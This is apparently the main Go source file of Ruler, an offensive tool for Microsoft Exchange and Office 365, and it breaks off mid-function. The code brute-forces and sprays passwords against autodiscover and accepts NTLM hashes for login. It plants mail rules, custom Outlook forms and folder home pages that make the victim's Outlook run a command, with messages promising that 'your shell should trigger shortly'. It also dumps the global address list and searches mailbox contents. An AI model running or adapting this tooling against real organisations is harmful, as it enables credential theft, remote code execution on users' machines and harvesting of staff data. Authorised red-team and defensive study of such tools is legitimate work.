package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/howeyc/gopass"
	"github.com/sensepost/ruler/autodiscover"
	"github.com/sensepost/ruler/forms"
	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
	"github.com/urfave/cli"
)

//globals
var config utils.Session

func exit(err error) {
	//we had an error
	if err != nil {
		utils.Error.Println(err)
	}

	//let's disconnect from the MAPI session
	exitcode, err := mapi.Disconnect()
	if err != nil {
		utils.Error.Println(err)
	}
	os.Exit(exitcode)
}

//function to perform an autodiscover
func discover(c *cli.Context) error {

	if c.GlobalString("domain") == "" {
		return fmt.Errorf("Required param --domain is missing")
	}

	if c.Bool("dump") == true && (c.GlobalString("username") == "" && c.GlobalString("email") == "") {
		return fmt.Errorf("--dump requires credentials to be set")
	}

	if c.Bool("dump") == false && (c.GlobalString("username") != "" || c.GlobalString("email") != "") {
		return fmt.Errorf("Credentials supplied, but no --dump. No credentials required for URL discovery. Dumping requires credentials to be set")
	}

	if c.Bool("dump") == true && c.String("out") == "" {
		return fmt.Errorf("--dump requires an out file to be set with --out /path/to/file.txt")
	}

	var err error
	if c.Bool("dump") == true && c.GlobalString("password") == "" && c.GlobalString("hash") == "" {
		fmt.Printf("Password: ")
		var pass []byte
		pass, err = gopass.GetPasswd()
		if err != nil {
			// Handle gopass.ErrInterrupted or getch() read error
			return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
		}
		config.Pass = string(pass)
	} else {
		config.Pass = c.GlobalString("password")
		if config.NTHash, err = hex.DecodeString(c.GlobalString("hash")); err != nil {
			return fmt.Errorf("Invalid hash provided. Hex decode failed")
		}
	}

	//setup our autodiscover service
	config.Domain = c.GlobalString("domain")
	if c.GlobalString("username") == "" {
		config.User = "nosuchuser"
	} else {
		config.User = c.GlobalString("username")
	}
	if c.GlobalString("email") == "" {
		config.Email = "nosuchemail"
	} else {
		config.Email = c.GlobalString("email")
	}
	config.Basic = c.GlobalBool("basic")
	config.Insecure = c.GlobalBool("insecure")
	config.Verbose = c.GlobalBool("verbose")
	config.Admin = c.GlobalBool("admin")
	config.RPCEncrypt = !c.GlobalBool("noencrypt")
	config.CookieJar, _ = cookiejar.New(nil)
	config.Proxy = c.GlobalString("proxy")
	url := c.GlobalString("url")

	if url == "" {
		url = config.Domain
	}

	autodiscover.SessionConfig = &config

	//var resp *utils.AutodiscoverResp
	var domain string

	if c.Bool("mapi") == true {
		_, domain, err = autodiscover.MAPIDiscover(url)
	} else {
		_, domain, err = autodiscover.Autodiscover(url)
	}

	if domain == "" && err != nil {
		return err
	}

	if c.Bool("dump") == true {
		path := c.String("out")
		utils.Info.Printf("Looks like the autodiscover service was found, Writing to: %s \n", path)
		fout, _ := os.OpenFile(path, os.O_CREATE|os.O_WRONLY, 0666)
		_, err := fout.WriteString(domain)
		if err != nil {
			return fmt.Errorf("Couldn't write to file for some reason... %s", err)
		}
	} else {
		utils.Info.Printf("Looks like the autodiscover service is at: %s \n", domain)
		utils.Info.Println("Checking if domain is hosted on Office 365")
		//smart check to see if domain is on office365
		//A request to https://login.microsoftonline.com/<domain>/.well-known/openid-configuration
		//response with 400 for none-hosted domains
		//response with 200 for office365 domains

		resp, _ := http.Get(fmt.Sprintf("https://login.microsoftonline.com/%s/.well-known/openid-configuration", config.Domain))
		if resp.StatusCode == 400 {
			utils.Info.Println("Domain is not hosted on Office 365")
		} else if resp.StatusCode == 200 {
			utils.Info.Println("Domain is hosted on Office 365")
		} else {
			utils.Error.Println("Received an unexpected response")
			utils.Debug.Println(resp.StatusCode)
		}
	}

	return nil
}

//function to perform a bruteforce
func brute(c *cli.Context) error {
	if c.String("users") == "" && c.String("userpass") == "" {
		return fmt.Errorf("Either --users or --userpass required")
	}
	if c.String("passwords") == "" && c.String("userpass") == "" {
		return fmt.Errorf("Either --passwords or --userpass required")

	}
	if c.GlobalString("domain") == "" && c.GlobalString("url") == "" && c.GlobalBool("o365") == false {
		return fmt.Errorf("Either --domain or --url required")
	}

	utils.Info.Println("Starting bruteforce")
	domain := c.GlobalString("domain")
	if c.GlobalString("url") != "" {
		domain = c.GlobalString("url")
	}
	if c.GlobalBool("o365") == true {
		domain = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
	}
	if e := autodiscover.Init(domain, c.String("users"), c.String("passwords"), c.String("userpass"), c.GlobalString("proxy"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"), c.Int("threads")); e != nil {
		return e
	}

	if c.String("userpass") == "" {
		autodiscover.BruteForce()
	} else {
		autodiscover.UserPassBruteForce()
	}
	return nil
}

//Function to add new rule
func addRule(c *cli.Context) error {
	utils.Info.Println("Adding Rule")

	res, err := mapi.ExecuteMailRuleAdd(c.String("name"), c.String("trigger"), c.String("location"), true)
	if err != nil || res.StatusCode == 255 {
		return fmt.Errorf("Failed to create rule. %s", err)
	}

	utils.Info.Println("Rule Added. Fetching list of rules...")

	printRules()

	if c.Bool("send") {
		utils.Info.Println("Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
		//initate a ping sequence, just incase we are on RPC/HTTP
		//we need to keep the socket open
		go mapi.Ping()
		time.Sleep(time.Second * (time.Duration)(30))
		utils.Info.Println("Sending email")
		if c.String("subject") == "" {
			sendMessage(c.String("trigger"), c.String("body"))
		} else {
			sendMessage(c.String("subject"), c.String("body"))
		}

	}

	return nil
}

//Function to delete a rule
func deleteRule(c *cli.Context) error {
	var ruleid []byte
	var err error

	if c.String("id") == "" && c.String("name") != "" {
		rules, er := mapi.DisplayRules()
		if er != nil {
			return er
		}
		utils.Info.Printf("Found %d rules. Extracting ids\n", len(rules))
		for _, v := range rules {
			if utils.FromUnicode(v.RuleName) == c.String("name") {
				reader := bufio.NewReader(os.Stdin)
				utils.Question.Printf("Delete rule with id %x [y/N]: ", v.RuleID)
				ans, _ := reader.ReadString('\n')
				if ans == "y\n" || ans == "Y\n" || ans == "yes\n" {
					ruleid = v.RuleID
					err = mapi.ExecuteMailRuleDelete(ruleid)
					if err != nil {
						utils.Error.Printf("Failed to delete rule")
					}
				}
			}
		}
		if ruleid == nil {
			return fmt.Errorf("No rule with supplied name found")
		}
	} else {
		ruleid, err = hex.DecodeString(c.String("id"))
		if err != nil {
			return fmt.Errorf("Incorrect ruleid format. Try --name if you wish to supply a rule's name rather than id")
		}
		err = mapi.ExecuteMailRuleDelete(ruleid)
		if err != nil {
			utils.Error.Printf("Failed to delete rule")
		}
	}

	if err == nil {
		utils.Info.Println("Fetching list of remaining rules...")
		er := printRules()
		if er != nil {
			return er
		}
	}
	return err
}

//Function to display all rules
func displayRules(c *cli.Context) error {
	utils.Info.Println("Retrieving Rules")
	er := printRules()
	return er
}

//sendMessage sends a message to the user, using their own Account
//uses supplied subject and body
func sendMessage(subject, body string) error {

	propertyTags := make([]mapi.PropertyTag, 1)
	propertyTags[0] = mapi.PidTagDisplayName

	_, er := mapi.GetFolder(mapi.OUTBOX, nil) //propertyTags)
	if er != nil {
		return er
	}
	_, er = mapi.SendMessage(subject, body)
	if er != nil {
		return er
	}
	utils.Info.Println("Message sent, your shell should trigger shortly.")

	return nil
}

//Function to connect to the Exchange server
func connect(c *cli.Context) error {
	var err error
	//if no password or hash was supplied, read from stdin
	if c.GlobalString("password") == "" && c.GlobalString("hash") == "" && c.GlobalString("config") == "" {
		fmt.Printf("Password: ")
		var pass []byte
		pass, err = gopass.GetPasswd()
		if err != nil {
			// Handle gopass.ErrInterrupted or getch() read error
			return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
		}
		config.Pass = string(pass)
	} else {
		config.Pass = c.GlobalString("password")
		if config.NTHash, err = hex.DecodeString(c.GlobalString("hash")); err != nil {
			return fmt.Errorf("Invalid hash provided. Hex decode failed")
		}
	}
	//setup our autodiscover service
	config.Domain = c.GlobalString("domain")
	config.User = c.GlobalString("username")
	config.Email = c.GlobalString("email")
	config.Basic = c.GlobalBool("basic")
	config.Insecure = c.GlobalBool("insecure")
	config.Verbose = c.GlobalBool("verbose")
	config.Admin = c.GlobalBool("admin")
	config.RPCEncrypt = !c.GlobalBool("noencrypt")
	config.CookieJar, _ = cookiejar.New(nil)
	config.Proxy = c.GlobalString("proxy")
	//add supplied cookie to the cookie jar
	if c.GlobalString("cookie") != "" {
		//split into cookies and then into name : value
		cookies := strings.Split(c.GlobalString("cookie"), ";")
		var cookieJarTmp []*http.Cookie
		var cdomain string
		//split and get the domain from the email
		if eparts := strings.Split(c.GlobalString("email"), "@"); len(eparts) == 2 {
			cdomain = eparts[1]
		} else {
			return fmt.Errorf("[x] Invalid email address")
		}

		for _, v := range cookies {
			cookie := strings.Split(v, "=")
			c := &http.Cookie{
				Name:   cookie[0],
				Value:  cookie[1],
				Path:   "/",
				Domain: cdomain,
			}
			cookieJarTmp = append(cookieJarTmp, c)
		}
		u, _ := url.Parse(fmt.Sprintf("https://%s/", cdomain))
		config.CookieJar.SetCookies(u, cookieJarTmp)
	}

	config.CookieJar, _ = cookiejar.New(nil)

	//add supplied cookie to the cookie jar
	if c.GlobalString("cookie") != "" {
		//split into cookies and then into name : value
		cookies := strings.Split(c.GlobalString("cookie"), ";")
		var cookieJarTmp []*http.Cookie
		var cdomain string
		//split and get the domain from the email
		if eparts := strings.Split(c.GlobalString("email"), "@"); len(eparts) == 2 {
			cdomain = eparts[1]
		} else {
			return fmt.Errorf("Invalid email address")
		}

		for _, v := range cookies {
			cookie := strings.Split(v, "=")
			c := &http.Cookie{
				Name:   cookie[0],
				Value:  cookie[1],
				Path:   "/",
				Domain: cdomain,
			}
			cookieJarTmp = append(cookieJarTmp, c)
		}
		u, _ := url.Parse(fmt.Sprintf("https://%s/", cdomain))
		config.CookieJar.SetCookies(u, cookieJarTmp)
	}

	url := c.GlobalString("url")

	if c.GlobalBool("o365") == true {
		url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
	}

	autodiscover.SessionConfig = &config

	var resp *utils.AutodiscoverResp
	var rawAutodiscover string

	var mapiURL, abkURL, userDN string

	//try connect to MAPI/HTTP first -- this is faster and the code-base is more stable
	//unless of course the global "RPC" flag has been set, which specifies we should just use
	//RPC/HTTP from the get-go
	if c.GlobalString("config") != "" {
		var yamlConfig utils.YamlConfig
		if yamlConfig, err = utils.ReadYml(c.GlobalString("config")); err != nil {
			utils.Error.Println("Invalid Config file.")
			return err
		}

		//set all fields from yamlConfig into config (this overrides cmdline options)
		if yamlConfig.Username != "" {
			config.User = yamlConfig.Username
		}
		if yamlConfig.Password != "" {
			config.Pass = yamlConfig.Password
		}
		if yamlConfig.Email != "" {
			config.Email = yamlConfig.Email
		}
		if yamlConfig.Hash != "" {
			if config.NTHash, err = hex.DecodeString(yamlConfig.Hash); err != nil {
				return fmt.Errorf("Invalid hash provided. Hex decode failed")
			}
		}

		if config.User == "" && config.Email == "" {
			return fmt.Errorf("Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config")
		}

		if config.Pass == "" {
			fmt.Printf("Password: ")
			var pass []byte
			pass, err = gopass.GetPasswd()
			if err != nil {
				// Handle gopass.ErrInterrupted or getch() read error
				return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
			}
			config.Pass = string(pass)
		}

		if yamlConfig.RPC == true {
			//create RPC URL
			config.RPCURL = fmt.Sprintf("%s?%s:6001", yamlConfig.RPCURL, yamlConfig.Mailbox)
			config.RPCEncrypt = yamlConfig.RPCEncrypt
			config.RPCNtlm = yamlConfig.Ntlm
		} else {
			mapiURL = fmt.Sprintf("%s?MailboxId=%s", yamlConfig.MapiURL, yamlConfig.Mailbox)
		}
		userDN = yamlConfig.UserDN

	} else if !c.GlobalBool("rpc") {

		if config.User == "" && config.Email == "" {
			return fmt.Errorf("Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config")
		}

		if c.GlobalBool("nocache") == false { //unless user specified nocache, check cache for existing autodiscover
			resp = autodiscover.CheckCache(config.Email)
		}
		if resp == nil {
			resp, rawAutodiscover, err = autodiscover.GetMapiHTTP(config.Email, url, resp)
			if err != nil {
				exit(err)
			}
		}
		mapiURL = mapi.ExtractMapiURL(resp)
		abkURL = mapi.ExtractMapiAddressBookURL(resp)
		userDN = resp.Response.User.LegacyDN

		if mapiURL == "" { //try RPC
			resp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
			if err != nil {
				exit(err)
			}
			if resp.Response.User.LegacyDN == "" {
				return fmt.Errorf("Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error)
			}

			if c.GlobalBool("nocache") == false {
				autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
			}
		} else {

			utils.Trace.Println("MAPI URL found: ", mapiURL)
			utils.Trace.Println("MAPI AddressBook URL found: ", abkURL)

			//mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
			if c.GlobalBool("nocache") == false {
				autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
			}
		}

	} else {

		if config.User == "" && config.Email == "" {
			return fmt.Errorf("Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config")
		}

		utils.Trace.Println("RPC/HTTP forced, trying RPC/HTTP")
		if c.GlobalBool("nocache") == false { //unless user specified nocache, check cache for existing autodiscover
			resp = autodiscover.CheckCache(config.Email)
		}

		resp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
		if err != nil {
			exit(err)
		}

		userDN = resp.Response.User.LegacyDN

		if c.GlobalBool("nocache") == false {
			autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
		}
	}

	if config.RPCURL != "" {
		mapi.Init(&config, userDN, "", "", mapi.RPC)
	} else {
		mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
	}

	//now we should do the login
	logon, err := mapi.Authenticate()

	if err != nil {
		exit(err)
	} else if logon.MailboxGUID != nil {

		utils.Trace.Println("And we are authenticated")
		utils.Trace.Println("Openning the Inbox")

		propertyTags := make([]mapi.PropertyTag, 2)
		propertyTags[0] = mapi.PidTagDisplayName
		propertyTags[1] = mapi.PidTagSubfolders
		mapi.GetFolder(mapi.INBOX, propertyTags) //Open Inbox
	}
	return nil
}

func printRules() error {
	//rules, er := mapi.DisplayRules()
	cols := make([]mapi.PropertyTag, 2)
	cols[0] = mapi.PidTagRuleName
	cols[1] = mapi.PidTagRuleID
	//cols[2] = mapi.PidTagRuleActions

	rows, er := mapi.FetchRules(cols)

	if er != nil {
		return er
	}

	if rows.RowCount > 0 {
		utils.Info.Printf("Found %d rules\n", rows.RowCount)
		maxwidth := 30

		for k := 0; k < int(rows.RowCount); k++ {
			if len(string(rows.RowData[k][0].ValueArray)) > maxwidth {
				maxwidth = len(string(rows.RowData[k][0].ValueArray))
			}
		}
		maxwidth -= 10
		fmstr1 := fmt.Sprintf("%%-%ds | %%-16s \n", maxwidth)
		fmstr2 := fmt.Sprintf("%%-%ds | %%x \n", maxwidth)
		utils.Info.Printf(fmstr1, "Rule Name", "Rule ID")
		utils.Info.Printf("%s|%s\n", (strings.Repeat("-", maxwidth+1)), strings.Repeat("-", 18))
		for k := 0; k < int(rows.RowCount); k++ {
			clientSide := false
			clientApp := ""
			/*
				rd := mapi.RuleAction{}
				rd.Unmarshal(rows.RowData[k][2].ValueArray)
				if rd.ActionType == 0x05 {
					for _, a := range rd.ActionData.Conditions {
						if a.Tag[1] == 0x49 {
							clientSide = true
							clientApp = string(utils.FromUnicode(a.Value))
							break
						}
					}
				}
			*/
			if clientSide == true {
				utils.Info.Printf(fmstr2, string(utils.FromUnicode(rows.RowData[k][0].ValueArray)), rows.RowData[k][1].ValueArray, fmt.Sprintf("* %s", clientApp))
			} else {
				utils.Info.Printf(fmstr2, string(utils.FromUnicode(rows.RowData[k][0].ValueArray)), rows.RowData[k][1].ValueArray)
			}
		}
		utils.Info.Println()
	} else {
		utils.Info.Printf("No Rules Found\n")
	}
	return nil
}

//Function to display all addressbook entries
func abkList(c *cli.Context) error {
	utils.Trace.Println("Let's play addressbook")
	if config.Transport == mapi.RPC {
		return fmt.Errorf("Only MAPI/HTTP is currently supported for addressbook interaction")
	}

	mapi.BindAddressBook()

	columns := make([]mapi.PropertyTag, 2)
	columns[0] = mapi.PidTagDisplayName
	columns[1] = mapi.PidTagSMTPAddress
	rows, _ := mapi.QueryRows(100, []byte{}, columns) //pull first 255 entries
	utils.Info.Println("Found the following entries: ")
	maxwidth := 30
	fmstr1 := fmt.Sprintf("%%-%ds | %%-s\n", maxwidth)
	fmstr2 := fmt.Sprintf("%%-%ds | %%s\n", maxwidth)
	utils.Info.Printf(fmstr1, "Display Name", "SMTP Address")
	utils.Info.Printf("%s|%s\n", (strings.Repeat("-", maxwidth+1)), strings.Repeat("-", 18))
	for k := 0; k < int(rows.RowCount); k++ {
		if len(rows.RowData[k].AddressBookPropertyValue) == 2 {
			disp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)
			if len(disp) > maxwidth {
				disp = disp[:maxwidth-2]
			}
			utils.Clear.Printf(fmstr2, string(disp), rows.RowData[k].AddressBookPropertyValue[1].Value)
		}
	}
	state := mapi.STAT{}
	state.Unmarshal(rows.State)
	totalrows := state.TotalRecs
	for i := 0; i < int(totalrows); i += 100 {
		rows, _ = mapi.QueryRows(100, rows.State, columns)
		for k := 0; k < int(rows.RowCount); k++ {
			if len(rows.RowData[k].AddressBookPropertyValue) == 2 {
				disp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)
				if len(disp) > maxwidth {
					disp = disp[:maxwidth-2]
				}
				utils.Clear.Printf(fmstr2, string(disp), rows.RowData[k].AddressBookPropertyValue[1].Value)
			}
		}
	}
	return nil
}

//Function to display all addressbook entries
func abkDump(c *cli.Context) error {
	if config.Transport == mapi.RPC {
		return fmt.Errorf("Address book support is currently limited to MAPI/HTTP")
	}
	utils.Trace.Println("Let's Dump the addressbook")
	fout, err := os.OpenFile(c.String("output"), os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		return fmt.Errorf("Couldn't create file to write to... %s", err)
	}

	mapi.BindAddressBook()
	columns := make([]mapi.PropertyTag, 2)
	columns[0] = mapi.PidTagDisplayName
	columns[1] = mapi.PidTagSMTPAddress
	rows, _ := mapi.QueryRows(100, []byte{}, columns) //pull first 255 entries

	for k := 0; k < int(rows.RowCount); k++ {
		if len(rows.RowData[k].AddressBookPropertyValue) == 2 {
			disp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)
			email := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[1].Value)
			if _, err := fout.WriteString(fmt.Sprintf("%s , %s\n", disp, email)); err != nil {
				return fmt.Errorf("Couldn't write to file... %s", err)
			}
		}
	}
	state := mapi.STAT{}
	state.Unmarshal(rows.State)
	totalrows := state.TotalRecs
	utils.Info.Printf("Found %d entries in the GAL. Dumping...", totalrows)
	for i := 0; i < int(totalrows); i += 100 {
		rows, _ = mapi.QueryRows(100, rows.State, columns)
		utils.Info.Printf("Dumping %d/%d", i+100, totalrows)
		for k := 0; k < int(rows.RowCount); k++ {
			if len(rows.RowData[k].AddressBookPropertyValue) == 2 {
				disp := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[0].Value)
				email := utils.FromUnicode(rows.RowData[k].AddressBookPropertyValue[1].Value)
				if _, err := fout.WriteString(fmt.Sprintf("%s | %s\n", disp, email)); err != nil {
					return fmt.Errorf("Couldn't write to file... %s", err)
				}
			}
		}
	}
	return nil
}

func createForm(c *cli.Context) error {
	//first check that supplied command is valid
	var command string
	if c.String("input") != "" {
		cmd, err := utils.ReadFile(c.String("input"))
		if err != nil {
			return err
		}
		command = string(cmd)
	} else {
		command = c.String("command")
	}

	if len(command) > 4096 {
		return fmt.Errorf("Command is too large. Maximum command size is 4096 characters.")
	}

	suffix := c.String("suffix")
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]

	utils.Trace.Println("Verifying that form does not exist.")
	//check that form does not already exist
	if err := forms.CheckForm(folderid, suffix); err != nil {
		return err
	}
	var rname, triggerword string
	if c.Bool("rule") == true {
		rname = utils.GenerateString(6)
		triggerword = utils.GenerateString(8)
	} else {
		rname = "NORULE"
	}

	msgid, err := forms.CreateFormMessage(suffix, rname)
	if err != nil {
		return err
	}

	if err := forms.CreateFormAttachmentPointer(folderid, msgid); err != nil {
		return err
	}
	if c.Bool("raw") == true {
		if err := forms.CreateFormAttachmentForDeleteTemplate(folderid, msgid, command); err != nil {
			return err
		}
	} else {
		if err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {
			return err
		}
	}
	utils.Info.Println("Form created successfully")

	if c.Bool("rule") == true {
		utils.Info.Printf("Rule trigger set. Adding new rule with name %s\n", rname)
		utils.Info.Printf("Adding new rule with trigger of %s\n", triggerword)

		//create delete rule
		if _, err := mapi.ExecuteDeleteRuleAdd(rname, triggerword); err != nil {
			utils.Error.Println("Failed to create the trigger rule")
		} else {
			utils.Info.Println("Trigger rule created.")
		}

		if c.Bool("send") == false {
			utils.Info.Printf("Autosend disabled. You'll need to trigger the rule by sending an email with the keyword \"%s\" present in the subject. \n", triggerword)
		}
		c.Set("subject", triggerword)
	}

	//trigger the email if the send option is enabled
	if c.Bool("send") == true {
		return triggerForm(c)
	}
	return nil
}

func triggerForm(c *cli.Context) error {
	subject := c.String("subject")
	body := c.String("body")
	suffix := c.String("suffix")
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
	target := mapi.AuthSession.Email

	utils.Trace.Println("Creating Trigger message.")
	msgid, err := forms.CreateFormTriggerMessage(suffix, subject, body)
	if err != nil {
		return err
	}
	utils.Info.Println("Sending email.")
	//send to another account
	if c.String("target") != "" {
		target = c.String("target")
	}

	if _, err = mapi.SendExistingMessage(folderid, msgid, target); err != nil {
		return err
	}
	utils.Info.Println("Email sent! Hopefully you will have a shell soon.")
	return nil
}

func deleteForm(c *cli.Context) error {
	suffix := c.String("suffix")
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]

	if _, err := forms.DeleteForm(suffix, folderid); err != nil {
		utils.Error.Println("Failed to delete form.")
		return err
	}

	return nil
}

func displayForms(c *cli.Context) error {
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]

	if err := forms.DisplayForms(folderid); err != nil {
		utils.Error.Println("Failed to find any forms.")
		return err
	}
	return nil
}

func createHomePage(c *cli.Context) error {
	utils.Info.Println("Creating new endpoint")
	wvpObjectStream := mapi.WebViewPersistenceObjectStream{Version: 2, Type: 1, Flags: 1}
	wvpObjectStream.Reserved = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	wvpObjectStream.Value = utils.UniString(c.String("url"))
	wvpObjectStream.Size = uint32(len(wvpObjectStream.Value))
	prop := wvpObjectStream.Marshal()
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
	propertyTags := make([]mapi.TaggedPropertyValue, 1)
	propertyTags[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagFolderWebViewInfo, PropertyValue: append(utils.COUNT(len(prop)), prop...)}

	if _, e := mapi.SetFolderProperties(folderid, propertyTags); e != nil {
		return e
	}
	utils.Info.Println("Verifying...")
	props := make([]mapi.PropertyTag, 1)
	props[0] = mapi.PidTagFolderWebViewInfo
	_, _, e := mapi.GetFolderProps(mapi.INBOX, props)
	if e != nil {
		utils.Warning.Println("New endpoint not set")
		return e
	}
	utils.Info.Println("New endpoint set")
	utils.Info.Println("Trying to force trigger")
	mapi.CreateFolder("xyz", true)

	return nil
}

func displayHomePage() error {
	utils.Info.Println("Getting existing endpoint")
	props := make([]mapi.PropertyTag, 1)
	props[0] = mapi.PidTagFolderWebViewInfo
	_, c, e := mapi.GetFolderProps(mapi.INBOX, props)
	if e == nil {
		wvp := mapi.WebViewPersistenceObjectStream{}
		wvp.Unmarshal(c.RowData[0].ValueArray)

		if utils.FromUnicode(wvp.Value) == "" {
			utils.Info.Println("No endpoint set")
			return nil
		}

		utils.Info.Printf("Found endpoint: %s\n", utils.FromUnicode(wvp.Value))

		if wvp.Flags == 0 {
			utils.Info.Println("Webview is set as DISABLED")
		} else {
			utils.Info.Println("Webview is set as ENABLED")
		}
	}
	return e
}

func deleteHomePage() error {
	utils.Info.Println("Unsetting homepage. Remember to use 'add' if you want to reset this to the original value")
	wvpObjectStream := mapi.WebViewPersistenceObjectStream{Version: 2, Type: 1, Flags: 0}
	wvpObjectStream.Reserved = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	wvpObjectStream.Value = utils.UniString("")
	wvpObjectStream.Size = uint32(len(wvpObjectStream.Value))
	prop := wvpObjectStream.Marshal()
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
	propertyTags := make([]mapi.TaggedPropertyValue, 1)
	propertyTags[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagFolderWebViewInfo, PropertyValue: append(utils.COUNT(len(prop)), prop...)}

	if _, e := mapi.SetFolderProperties(folderid, propertyTags); e != nil {
		return e
	}
	utils.Info.Println("Verifying...")
	props := make([]mapi.PropertyTag, 1)
	props[0] = mapi.PidTagFolderWebViewInfo
	_, _, e := mapi.GetFolderProps(mapi.INBOX, props)
	if e == nil {
		utils.Info.Println("Webview reset")
	}

	utils.Info.Println("Cleaning up and removing trigger")

	rows, er := mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])
	var FolderID []byte
	if er == nil {
		for k := 0; k < len(rows.RowData); k++ {
			//utils.Info.Println(fromUnicode(rows.RowData[k][0].ValueArray))
			//convert string from unicode and then check if it is our target folder
			if utils.FromUnicode(rows.RowData[k][0].ValueArray) == "xyz" {
				FolderID = rows.RowData[k][1].ValueArray
				break
			}
		}
	}
	if _, er := mapi.DeleteFolder(folderid, FolderID); er != nil {
		utils.Warning.Println("Failed to delete trigger. Should be fine though.")
	}

	return nil
}

func searchFolders(c *cli.Context) error {

	utils.Info.Println("Checking if a search folder exists")

	searchFolderName := "searcher"

	searchFolder, err := checkFolder(searchFolderName)
	if err != nil {
		return fmt.Errorf("Unable to create a search folder to use. %s", err)
	}

	utils.Info.Println("Setting search criteria")

	folderids := mapi.AuthSession.Folderids[mapi.INBOX]

	//create the search criteria restrictions

	restrict := mapi.AndRestriction{RestrictType: 0x00}
	restrict.RestrictCount = uint16(2)

	//var orRestrict mapi.OrRestriction

	//restrict by subject or PidTagBody
	restrictContent := mapi.ContentRestriction{RestrictType: 0x03}
	restrictContent.FuzzyLevelLow = mapi.FLSUBSTRING
	restrictContent.FuzzyLevelHigh = mapi.FLIGNORECASE
	if c.Bool("subject") == true {
		restrictContent.PropertyTag = mapi.PidTagSubject
	} else {
		restrictContent.PropertyTag = mapi.PidTagBody
	}

	restrictContent.PropertyValue = mapi.TaggedPropertyValue{PropertyTag: restrictContent.PropertyTag, PropertyValue: utils.UniString(c.String("term"))}

	//Restrict to IPM.Note
	restrictMsgClass := mapi.ContentRestriction{RestrictType: 0x03}
	restrictMsgClass.FuzzyLevelLow = mapi.FLPREFIX
	restrictMsgClass.FuzzyLevelHigh = mapi.FLIGNORECASE
	restrictMsgClass.PropertyTag = mapi.PidTagMessageClass
	restrictMsgClass.PropertyValue = mapi.TaggedPropertyValue{PropertyTag: restrictMsgClass.PropertyTag, PropertyValue: utils.UniString("IPM.Note")}

	restrict.Restricts = []mapi.Restriction{restrictContent, restrictMsgClass}
	/*
		if c.Bool("subject") == true {
			restrict.Restricts = []mapi.Restriction{restrictContent, restrictMsgClass}
		} else {
			orRestrict = mapi.OrRestriction{RestrictType: 0x01}
			orRestrict.RestrictCount = uint16(2)
			orRestrict.Restricts = []mapi.Restriction{restrictContent, restrictHTML}
			restrict.Restricts = []mapi.Restriction{orRestrict, restrictMsgClass}
		}
	*/
	if _, err := mapi.SetSearchCriteria(folderids, searchFolder, restrict); err != nil {
		return fmt.Errorf("Unable to set search criteria: %s", err)
	}

	utils.Info.Println("Waiting for search folder to populate")
	for x := 0; x < 1; x++ {
		//	time.Sleep(time.Second * (time.Duration)(5))
		res, _ := mapi.GetSearchCriteria(searchFolder)
		//do check if search is complete
		//fmt.Printf("Search Flag: %x\n", res.SearchFlags)
		if res.SearchFlags == 0x00001000 {
			break
		}
	}
	mapi.GetFolderFromID(searchFolder, nil)

	rows, err := mapi.GetContents(searchFolder)

	if rows == nil {
		utils.Info.Println("No results returned")
		return nil
	}

	for k := 0; k < len(rows.RowData); k++ {
		messageSubject := utils.FromUnicode(rows.RowData[k][0].ValueArray)
		messageid := rows.RowData[k][1].ValueArray
		columns := make([]mapi.PropertyTag, 1)
		columns[0] = mapi.PidTagBody //Column for the Message Body containing our payload

		buff, err := mapi.GetMessageFast(searchFolder, messageid, columns)
		if err != nil {
			continue
		}
		//convert buffer to rows

		messagerows := mapi.DecodeBufferToRows(buff.TransferBuffer, columns)
		payload := ""
		if len(messagerows[0].ValueArray) > 4 {
			payload = utils.FromUnicode(messagerows[0].ValueArray[:len(messagerows[0].ValueArray)-4])
		}
